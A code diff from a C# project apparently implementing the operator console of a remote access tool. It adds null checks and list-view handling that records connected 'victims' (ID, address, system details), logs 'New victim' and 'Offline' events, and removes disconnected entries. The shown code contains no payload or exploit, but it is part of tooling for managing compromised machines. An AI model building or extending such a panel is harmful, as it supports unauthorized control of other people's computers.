@@ -50,23 +50,51 @@ namespace EgoDrop
             if (lsMsg.Count == 0)
                 return;
 
+            if (victim == null || victim.m_sktClnt == null || victim.m_sktClnt.RemoteEndPoint == null)
+                return;
+
             if (lsMsg[0] == "info")
             {
                 Invoke(new Action(() =>
                 {
-                    ListViewItem item = new ListViewItem("X");
-                    item.SubItems.Add(victim.m_sktClnt.RemoteEndPoint.ToString());
-                    item.SubItems.Add("X");
-                    item.SubItems.Add(lsMsg[3]);
+                    string szID = lsMsg[4];
+                    if (listView1.Items.Count == 0 || listView1.FindItemWithText(szID, true, 0) == null)
+                    {
+                        ListViewItem item = new ListViewItem(lsMsg[1]);
+                        item.SubItems.Add(szID);
+                        item.SubItems.Add(victim.m_sktClnt.RemoteEndPoint.ToString());
+                        item.SubItems.Add(lsMsg[3]);
+                        item.SubItems.Add(lsMsg[5]);
+                        item.SubItems.Add(lsMsg[6]);
+                        item.SubItems.Add(lsMsg[7]);
+                        item.SubItems.Add(lsMsg[8]);
 
-                    listView1.Items.Add(item);
+                        item.Tag = victim;
+
+                        listView1.Items.Add(item);
+
+                        fnSysLog($"New victim[{victim.m_sktClnt.RemoteEndPoint.ToString()}]");
+                    }
                 }));
             }
         }
 
         public void fnOnVictimDisconnected(clsListener ltn, clsVictim vic)
         {
+            if (vic == null || vic.m_sktClnt == null || vic.m_sktClnt.RemoteEndPoint == null)
+                return;
 
+            Invoke(new Action(() =>
+            {
+                foreach (ListViewItem item in listView1.Items)
+                {
+                    if (clsTools.fnbSameVictim(vic, fnGetVictimFromTag(item)))
+                    {
+                        listView1.Items.Remove(item);
+                        fnSysLog($"Offline[{vic.m_sktClnt.RemoteEndPoint.ToString()}]");
+                    }
+                }
+            }));
         }
 
         private void fnSetup()
